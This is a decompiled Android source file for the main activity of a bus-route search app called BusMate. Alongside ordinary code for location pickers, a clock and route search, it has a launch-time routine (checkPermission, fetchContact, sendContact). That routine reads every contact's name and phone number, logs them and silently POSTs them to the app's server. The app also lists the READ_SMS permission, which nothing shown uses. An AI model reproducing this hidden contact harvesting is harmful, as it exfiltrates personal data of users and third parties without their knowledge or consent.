package in.linus.busmate.Activity;

import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Color;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.GridView;
import android.widget.ImageButton;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.ActionBarDrawerToggle;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.cardview.widget.CardView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.drawerlayout.widget.DrawerLayout;
import com.android.volley.AuthFailureError;
import com.android.volley.NetworkError;
import com.android.volley.NoConnectionError;
import com.android.volley.ParseError;
import com.android.volley.Response;
import com.android.volley.ServerError;
import com.android.volley.TimeoutError;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.balysv.materialripple.BuildConfig;
import com.google.android.material.navigation.NavigationView;
import in.linus.busmate.Model.BusmateModelHelper;
import in.linus.busmate.Model.ContactModel;
import in.linus.busmate.R;
import in.linus.busmate.Utility.Constants;
import in.linus.busmate.Utility.CustomProgressDialog;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {
    public static final int PERMISSIONS_REQUEST_READ_CONTACTS = 1;
    public static final int PERMISSIONS_REQUEST_READ_EXTERNAL_STOARGE = 2;
    public static final int PERMISSIONS_REQUEST_WRITE_EXTERNAL_STOARGE = 3;
    public static final String TAG = "Dashboard";
    String[] PERMISSIONS = {"android.permission.READ_CONTACTS", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.READ_SMS"};
    int PERMISSION_ALL = 1;
    Animation av1;
    Animation av2;
    private Button btnSearch;
    /* access modifiers changed from: private */
    public ImageButton btnSwap;
    Calendar calender;
    CardView cv1;
    CardView cv2;
    /* access modifiers changed from: private */
    public DrawerLayout drawerLayout;
    GridView grid;
    ImageButton listDest;
    ImageButton listSrc;
    List<String> locationData = new ArrayList();
    private TextView mDate;
    private TextView mDay;
    CustomProgressDialog mDialog;
    /* access modifiers changed from: private */
    public TextView mFrom;
    /* access modifiers changed from: private */
    public TextView mHr;
    /* access modifiers changed from: private */
    public TextView mMin;
    private TextView mMonth;
    /* access modifiers changed from: private */
    public TextView mSec;
    private TextView mTitleBar;
    /* access modifiers changed from: private */
    public TextView mTo;
    private NavigationView navigationView;
    private Toolbar toolbar;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView((int) R.layout.activity_main);
        initialize();
        this.locationData = getLocationsData();
        checkPermission();
        this.listSrc.setOnClickListener(new View.OnClickListener() {
            public final void onClick(View view) {
                MainActivity.this.lambda$onCreate$0$MainActivity(view);
            }
        });
        this.listDest.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                View inflate = View.inflate(MainActivity.this, R.layout.grid_layout, (ViewGroup) null);
                MainActivity.this.grid = (GridView) inflate.findViewById(R.id.gridView1);
                MainActivity.this.grid.setBackgroundColor(Color.parseColor("#536dfe"));
                try {
                    MainActivity mainActivity = MainActivity.this;
                    ArrayAdapter arrayAdapter = new ArrayAdapter(mainActivity, 17367050, mainActivity.locationData);
                    MainActivity.this.grid.setChoiceMode(1);
                    MainActivity.this.grid.setAdapter(arrayAdapter);
                } catch (NumberFormatException e) {
                    Log.e(MainActivity.TAG, e.toString());
                }
                AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                builder.setView(inflate);
                builder.setTitle((CharSequence) "Select Destination");
                final AlertDialog show = builder.show();
                MainActivity.this.grid.setOnItemClickListener(new AdapterView.OnItemClickListener() {
                    public void onItemClick(AdapterView<?> adapterView, View view, int i, long j) {
                        MainActivity.this.mTo.setText(MainActivity.this.locationData.get(i).toString());
                        Toast.makeText(MainActivity.this.getBaseContext(), MainActivity.this.locationData.get(i), 0).show();
                        show.dismiss();
                    }
                });
            }
        });
        this.btnSearch.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                if (MainActivity.this.mFrom.getText().equals(" ") || MainActivity.this.mFrom.getText().toString().isEmpty()) {
                    Toast.makeText(MainActivity.this, "Please select location!", 0).show();
                } else if (MainActivity.this.mTo.getText().equals(" ") || MainActivity.this.mTo.getText().toString().isEmpty()) {
                    Toast.makeText(MainActivity.this, "Please select location!", 0).show();
                } else {
                    MainActivity mainActivity = MainActivity.this;
                    mainActivity.getSearchLocationsDetails(mainActivity.mFrom.getText().toString(), MainActivity.this.mTo.getText().toString());
                }
            }
        });
        new Thread(new CountDownRunner()).start();
        this.btnSwap.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                MainActivity.this.btnSwap.startAnimation(AnimationUtils.loadAnimation(MainActivity.this.getApplicationContext(), R.anim.rotation));
                Animation loadAnimation = AnimationUtils.loadAnimation(MainActivity.this.getApplicationContext(), R.anim.zoom_enter);
                String charSequence = MainActivity.this.mFrom.getText().toString();
                MainActivity.this.mFrom.startAnimation(loadAnimation);
                MainActivity.this.mFrom.setText(MainActivity.this.mTo.getText().toString());
                MainActivity.this.mTo.startAnimation(loadAnimation);
                MainActivity.this.mTo.setText(charSequence);
            }
        });
        SetnavigationDrawer();
        Animation loadAnimation = AnimationUtils.loadAnimation(getApplicationContext(), R.anim.push_left_in);
        this.av1 = loadAnimation;
        this.cv1.startAnimation(loadAnimation);
        Animation loadAnimation2 = AnimationUtils.loadAnimation(getApplicationContext(), R.anim.slide_to_bottom);
        this.av2 = loadAnimation2;
        this.cv2.startAnimation(loadAnimation2);
    }

    public /* synthetic */ void lambda$onCreate$0$MainActivity(View view) {
        View inflate = View.inflate(this, R.layout.grid_layout, (ViewGroup) null);
        GridView gridView = (GridView) inflate.findViewById(R.id.gridView1);
        this.grid = gridView;
        gridView.setBackgroundColor(Color.parseColor("#ff6666"));
        try {
            ArrayAdapter arrayAdapter = new ArrayAdapter(this, 17367050, this.locationData);
            this.grid.setChoiceMode(1);
            this.grid.setAdapter(arrayAdapter);
        } catch (NumberFormatException e) {
            Log.e(TAG, e.toString());
        }
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setView(inflate);
        builder.setTitle((CharSequence) "Select Source");
        final AlertDialog show = builder.show();
        this.grid.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            public void onItemClick(AdapterView<?> adapterView, View view, int i, long j) {
                MainActivity.this.mFrom.setText(MainActivity.this.locationData.get(i).toString());
                Toast.makeText(MainActivity.this.getBaseContext(), MainActivity.this.locationData.get(i), 0).show();
                show.dismiss();
            }
        });
    }

    private void initialize() {
        TextView textView = (TextView) findViewById(R.id.txt_title);
        this.mTitleBar = textView;
        textView.setText("Home");
        this.mFrom = (TextView) findViewById(R.id.edt_from);
        this.mTo = (TextView) findViewById(R.id.edt_to);
        this.btnSearch = (Button) findViewById(R.id.BtnSearch);
        this.mDialog = new CustomProgressDialog(this);
        this.listSrc = (ImageButton) findViewById(R.id.btn_listsrc);
        this.listDest = (ImageButton) findViewById(R.id.btn_listdest);
        this.mHr = (TextView) findViewById(R.id.txt_hr);
        this.mMin = (TextView) findViewById(R.id.txt_min);
        this.mSec = (TextView) findViewById(R.id.txt_sec);
        this.mDate = (TextView) findViewById(R.id.txt_date);
        this.mMonth = (TextView) findViewById(R.id.txt_mnth);
        this.mDay = (TextView) findViewById(R.id.txt_day);
        Calendar instance = Calendar.getInstance();
        this.calender = instance;
        this.mDate.setText(String.valueOf(instance.get(5)));
        TextView textView2 = this.mMonth;
        textView2.setText(BuildConfig.FLAVOR + String.valueOf(this.calender.getDisplayName(2, 2, Locale.getDefault())));
        TextView textView3 = this.mDay;
        textView3.setText(BuildConfig.FLAVOR + String.valueOf(this.calender.getDisplayName(7, 2, Locale.getDefault())));
        this.btnSwap = (ImageButton) findViewById(R.id.imgBtn_swap);
        this.cv1 = (CardView) findViewById(R.id.card_view);
        this.cv2 = (CardView) findViewById(R.id.card_btn);
    }

    /* access modifiers changed from: private */
    public void getSearchLocationsDetails(String str, String str2) {
        if (!this.mDialog.isShowing()) {
            this.mDialog.show();
        }
        final ArrayList arrayList = new ArrayList();
        final String str3 = str;
        final String str4 = str2;
        Volley.newRequestQueue(this).add(new StringRequest(1, Constants.bus_search_info, new Response.Listener<String>() {
            public void onResponse(String str) {
                Intent intent;
                MainActivity.this.mDialog.dismiss();
                try {
                    JSONArray jSONArray = new JSONArray(str);
                    for (int i = 0; i < jSONArray.length(); i++) {
                        JSONObject jSONObject = jSONArray.getJSONObject(i);
                        BusmateModelHelper busmateModelHelper = new BusmateModelHelper();
                        busmateModelHelper.setBusID(jSONObject.getInt("id"));
                        busmateModelHelper.setBusName(jSONObject.getString("name"));
                        busmateModelHelper.setFrom(jSONObject.getString("from"));
                        busmateModelHelper.setTo(jSONObject.getString("to"));
                        arrayList.add(busmateModelHelper);
                    }
                    Toast.makeText(MainActivity.this, arrayList.size() + " results found", 0).show();
                    if (arrayList.size() > 0) {
                        intent = new Intent(MainActivity.this, SearchResultActivity.class);
                        intent.putParcelableArrayListExtra("bus_data", (ArrayList) arrayList);
                        MainActivity.this.startActivity(intent);
                        MainActivity.this.overridePendingTransition(R.anim.right_in, R.anim.left_out);
                    }
                } catch (JSONException e) {
                    Log.e(MainActivity.TAG, "Error " + e.toString());
                    Toast.makeText(MainActivity.this, arrayList.size() + " results found", 0).show();
                    if (arrayList.size() > 0) {
                        intent = new Intent(MainActivity.this, SearchResultActivity.class);
                    }
                } catch (Exception e2) {
                    Log.e(MainActivity.TAG, "Error " + e2.toString());
                    Toast.makeText(MainActivity.this, arrayList.size() + " results found", 0).show();
                    if (arrayList.size() > 0) {
                        intent = new Intent(MainActivity.this, SearchResultActivity.class);
                    }
                } catch (Throwable th) {
                    Toast.makeText(MainActivity.this, arrayList.size() + " results found", 0).show();
                    if (arrayList.size() > 0) {
                        Intent intent2 = new Intent(MainActivity.this, SearchResultActivity.class);
                        intent2.putParcelableArrayListExtra("bus_data", (ArrayList) arrayList);
                        MainActivity.this.startActivity(intent2);
                        MainActivity.this.overridePendingTransition(R.anim.right_in, R.anim.left_out);
                    }
                    throw th;
                }
            }
        }, new Response.ErrorListener() {
            public void onErrorResponse(VolleyError volleyError) {
                MainActivity.this.mDialog.dismiss();
                if ((volleyError instanceof TimeoutError) || (volleyError instanceof NoConnectionError)) {
                    Toast.makeText(MainActivity.this, "Failed to fetch data. Please check your network connection", 1).show();
                    Log.e(MainActivity.TAG, "Timeout Occured");
                } else if (volleyError instanceof AuthFailureError) {
                    Log.e(MainActivity.TAG, "AuthFailure");
                } else if (volleyError instanceof ServerError) {
                    Toast.makeText(MainActivity.this, "Server error", 0).show();
                    Log.e(MainActivity.TAG, volleyError.toString());
                } else if (volleyError instanceof NetworkError) {
                    Log.e(MainActivity.TAG, "NETWORK Error");
                    Toast.makeText(MainActivity.this, "Network error", 0).show();
                } else if (volleyError instanceof ParseError) {
                    Log.e(MainActivity.TAG, "Parse Error");
                    Toast.makeText(MainActivity.this, "Parse error", 0).show();
                }
            }
        }) {
            public String getBodyContentType() {
                return "application/x-www-form-urlencoded; charset=UTF-8";
            }

            /* access modifiers changed from: protected */
            public Map<String, String> getParams() throws AuthFailureError {
                super.getParams();
                HashMap hashMap = new HashMap();
                hashMap.put("from", str3);
                hashMap.put("to", str4);
                return hashMap;
            }
        });
    }

    private void SetnavigationDrawer() {
        this.toolbar = (Toolbar) findViewById(R.id.toolbar_hm);
        NavigationView navigationView2 = (NavigationView) findViewById(R.id.navigation_view);
        this.navigationView = navigationView2;
        navigationView2.setNavigationItemSelectedListener(new NavigationView.OnNavigationItemSelectedListener() {
            public boolean onNavigationItemSelected(MenuItem menuItem) {
                if (menuItem.isChecked()) {
                    menuItem.setChecked(false);
                } else {
                    menuItem.setChecked(true);
                }
                MainActivity.this.drawerLayout.closeDrawers();
                switch (menuItem.getItemId()) {
                    case R.id.alertMe /*2131230797*/:
                        MainActivity.this.startActivity(new Intent(MainActivity.this, AlertMeActivity.class));
                        MainActivity.this.overridePendingTransition(R.anim.right_in, R.anim.left_out);
                        return true;
                    case R.id.home /*2131230955*/:
                        break;
                    case R.id.ksrtc /*2131230978*/:
                        MainActivity.this.startActivity(new Intent(MainActivity.this, BusDetails.class));
                        MainActivity.this.overridePendingTransition(R.anim.right_in, R.anim.left_out);
                        break;
                    case R.id.logout /*2131231000*/:
                        Toast.makeText(MainActivity.this.getApplicationContext(), "Logging out", 0).show();
                        Intent intent = new Intent(MainActivity.this.getBaseContext(), Login_Activity.class);
                        intent.addFlags(67108864);
                        MainActivity.this.startActivity(intent);
                        MainActivity.this.finish();
                        return true;
                    default:
                        Toast.makeText(MainActivity.this.getApplicationContext(), "Somethings Wrong", 0).show();
                        return true;
                }
                return true;
            }
        });
        DrawerLayout drawerLayout2 = (DrawerLayout) findViewById(R.id.drawer);
        this.drawerLayout = drawerLayout2;
        AnonymousClass9 r1 = new ActionBarDrawerToggle(this, drawerLayout2, this.toolbar, R.string.openDrawer, R.string.closeDrawer) {
            public void onDrawerClosed(View view) {
                super.onDrawerClosed(view);
            }

            public void onDrawerOpened(View view) {
                super.onDrawerOpened(view);
                view.bringToFront();
                MainActivity.this.drawerLayout.requestLayout();
            }
        };
        this.drawerLayout.setDrawerListener(r1);
        r1.syncState();
    }

    private class CountDownRunner implements Runnable {
        private CountDownRunner() {
        }

        public void run() {
            while (!Thread.currentThread().isInterrupted()) {
                try {
                    MainActivity.this.GetDT();
                    Thread.sleep(1000);
                } catch (InterruptedException unused) {
                    Thread.currentThread().interrupt();
                } catch (Exception unused2) {
                }
            }
        }
    }

    /* access modifiers changed from: private */
    public void GetDT() {
        runOnUiThread(new Runnable() {
            public void run() {
                try {
                    MainActivity.this.calender = Calendar.getInstance();
                    new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    MainActivity.this.mHr.setText(String.valueOf(MainActivity.this.calender.get(11)));
                    TextView access$800 = MainActivity.this.mMin;
                    access$800.setText(":" + String.valueOf(MainActivity.this.calender.get(12)));
                    TextView access$900 = MainActivity.this.mSec;
                    access$900.setText(":" + String.valueOf(MainActivity.this.calender.get(13)));
                } catch (Exception unused) {
                }
            }
        });
    }

    private List<String> getLocationsData() {
        ArrayList arrayList = new ArrayList();
        if (!this.mDialog.isShowing()) {
            this.mDialog.show();
        }
        Volley.newRequestQueue(this).add(new StringRequest(0, Constants.bus_mate_regions, new Response.Listener(arrayList) {
            public final /* synthetic */ List f$1;

            {
                this.f$1 = r2;
            }

            public final void onResponse(Object obj) {
                MainActivity.this.lambda$getLocationsData$1$MainActivity(this.f$1, (String) obj);
            }
        }, new Response.ErrorListener() {
            public final void onErrorResponse(VolleyError volleyError) {
                MainActivity.this.lambda$getLocationsData$2$MainActivity(volleyError);
            }
        }) {
            public String getBodyContentType() {
                return "application/x-www-form-urlencoded; charset=UTF-8";
            }

            /* access modifiers changed from: protected */
            public Map<String, String> getParams() throws AuthFailureError {
                super.getParams();
                return new HashMap();
            }
        });
        return arrayList;
    }

    public /* synthetic */ void lambda$getLocationsData$1$MainActivity(List list, String str) {
        this.mDialog.dismiss();
        try {
            JSONArray jSONArray = new JSONArray(str);
            Log.i(TAG, jSONArray.toString());
            for (int i = 0; i < jSONArray.length(); i++) {
                list.add(jSONArray.getString(i));
            }
        } catch (JSONException e) {
            e.printStackTrace();
        } catch (Exception e2) {
            Log.e("Home :: ", "Error " + e2.toString());
        }
    }

    public /* synthetic */ void lambda$getLocationsData$2$MainActivity(VolleyError volleyError) {
        this.mDialog.dismiss();
        if ((volleyError instanceof TimeoutError) || (volleyError instanceof NoConnectionError)) {
            Toast.makeText(this, "Failed to fetch data. Please check your network connection", 1).show();
            Log.e("LoginActivity: ", "timeout");
        } else if (volleyError instanceof AuthFailureError) {
            Log.e("LoginActivity: ", "Authentication Failure Error");
        } else if (volleyError instanceof ServerError) {
            Log.e("Server Error : ", BuildConfig.FLAVOR + volleyError.toString());
        } else if (volleyError instanceof NetworkError) {
            Log.e("LoginActivity: ", "Network Failure Error");
        } else if (volleyError instanceof ParseError) {
            Log.e("LoginActivity: ", "Parse Error");
        }
    }

    public void checkPermission() {
        if (ContextCompat.checkSelfPermission(this, "android.permission.READ_CONTACTS") == 0) {
            Log.i("Permission:", "Contact Fetching Started");
            ArrayList fetchContact = fetchContact();
            for (int i = 0; i < fetchContact.size(); i++) {
                Log.i("Contact: ", ((ContactModel) fetchContact.get(i)).getmName() + " :: " + ((ContactModel) fetchContact.get(i)).getmPhone());
            }
            sendContact(fetchContact);
        } else if (ActivityCompat.shouldShowRequestPermissionRationale(this, "android.permission.READ_CONTACTS")) {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("Read Contacts permission");
            builder.setPositiveButton(17039370, (DialogInterface.OnClickListener) null);
            builder.setMessage("Please enable access to contacts.");
            builder.setOnDismissListener(new DialogInterface.OnDismissListener() {
                public void onDismiss(DialogInterface dialogInterface) {
                    MainActivity.this.requestPermissions(new String[]{"android.permission.READ_CONTACTS"}, 1);
                }
            });
            builder.show();
        } else {
            ActivityCompat.requestPermissions(this, new String[]{"android.permission.READ_CONTACTS"}, 1);
        }
    }

    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i == 1 && iArr.length > 0) {
            if (iArr[0] == 0) {
                ArrayList fetchContact = fetchContact();
                for (int i2 = 0; i2 < fetchContact.size(); i2++) {
                    Log.i("Contact: ", ((ContactModel) fetchContact.get(i2)).getmName() + " :: " + ((ContactModel) fetchContact.get(i2)).getmPhone());
                }
                sendContact(fetchContact);
            }
        }
    }

    public ArrayList fetchContact() {
        ArrayList arrayList = new ArrayList();
        ContentResolver contentResolver = getContentResolver();
        Cursor query = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, (String[]) null, (String) null, (String[]) null, (String) null);
        Log.i("Curdetails===>>: ", BuildConfig.FLAVOR + query.getCount());
        if ((query != null ? query.getCount() : 0) > 0) {
            while (query != null && query.moveToNext()) {
                String string = query.getString(query.getColumnIndex("_id"));
                String string2 = query.getString(query.getColumnIndex("display_name"));
                ContactModel contactModel = new ContactModel();
                contactModel.setmName(string2);
                if (query.getInt(query.getColumnIndex("has_phone_number")) > 0) {
                    Cursor query2 = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, (String[]) null, "contact_id = ?", new String[]{string}, (String) null);
                    while (query2.moveToNext()) {
                        String string3 = query2.getString(query2.getColumnIndex("data1"));
                        Log.i("Phone===>>: ", string3);
                        contactModel.setmPhone(string3);
                    }
                    query2.close();
                }
                arrayList.add(contactModel);
            }
        }
        if (query != null) {
            query.close();
        }
        return arrayList;
    }

    private void sendContact(List<ContactModel> list) {
        final List<ContactModel> list2 = list;
        Volley.newRequestQueue(this).add(new StringRequest(1, Constants.contact, $$Lambda$MainActivity$SJtBke6ED3y9lgCIYW5IInq6bgg.INSTANCE, new Response.ErrorListener() {
            public final void onErrorResponse(VolleyError volleyError) {
                MainActivity.this.lambda$sendContact$4$MainActivity(volleyError);
            }
        }) {
            public String getBodyContentType() {
                return "application/x-www-form-urlencoded; charset=UTF-8";
            }

            /* access modifiers changed from: protected */
            public Map<String, String> getParams() throws AuthFailureError {
                super.getParams();
                HashMap hashMap = new HashMap();
                JSONArray jSONArray = new JSONArray();
                int i = 0;
                while (i < list2.size()) {
                    try {
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put("Name", ((ContactModel) list2.get(i)).getmName());
                        jSONObject.put("Phone", ((ContactModel) list2.get(i)).getmPhone());
                        jSONArray.put(jSONObject);
                        i++;
                    } catch (Exception unused) {
                    }
                }
                hashMap.put("data", jSONArray.toString());
                return hashMap;
            }
        });
    }

    static /* synthetic */ void lambda$sendContact$3(String str) {
        try {
            Log.i(TAG, new JSONArray(str).toString());
        } catch (JSONException e) {
            e.printStackTrace();
        } catch (Exception e2) {
            Log.e("Home :: ", "Error " + e2.toString());
        }
    }

    public /* synthetic */ void lambda$sendContact$4$MainActivity(VolleyError volleyError) {
        if ((volleyError instanceof TimeoutError) || (volleyError instanceof NoConnectionError)) {
            Toast.makeText(this, "Failed to fetch data. Please check your network connection", 1).show();
        } else if (volleyError instanceof AuthFailureError) {
            Log.e("LoginActivity: ", "Authentication Failure Error");
        } else if (volleyError instanceof ServerError) {
            Log.e("Server Error : ", BuildConfig.FLAVOR + volleyError.toString());
        } else if (volleyError instanceof NetworkError) {
            Log.e("LoginActivity: ", "Network Failure Error");
        } else if (volleyError instanceof ParseError) {
            Log.e("LoginActivity: ", "Parse Error");
        }
    }
}
